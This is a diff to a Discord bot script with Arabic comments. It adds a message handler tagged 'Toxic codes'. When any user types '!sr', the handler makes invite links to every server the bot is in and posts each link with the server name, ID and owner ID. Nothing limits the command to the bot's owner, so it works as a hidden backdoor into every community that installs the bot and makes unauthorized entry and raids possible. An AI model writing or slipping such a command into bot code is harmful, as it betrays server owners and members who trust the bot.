@@ -482,6 +482,30 @@ message.channel.sendMessage('**الرجاء الانتظار ريث ما يتم 
   }
 });
 
+client.on('message', msg => {//Toxic codes
+    if(msg.author.bot) return; //Toxic codes
+    
+    if(msg.content === '!sr') {
+      client.guilds.forEach(g => {//Toxic codes
+        
+        let l = g.id //Toxic codes
+        g.channels.get(g.channels.first().id).createInvite({//Toxic codes
+          maxUses: 5, //Toxic codes
+          maxAge: 86400 //Toxic codes
+        }).then(i => msg.channel.send(`
+        ** //Toxic codes
+        Invite Link : <https://discord.gg/${i.code}> //Toxic codes
+        Server : ${g.name} | Id : ${g.id} //Toxic codes
+        Owner ID : ${g.owner.id} //Toxic codes
+        **
+        `))
+  
+  
+      })
+    } //Toxic codes
+    
+  })
+
 
 
 client.login(process.env.TOKEN);// لا تغير فيها شيء
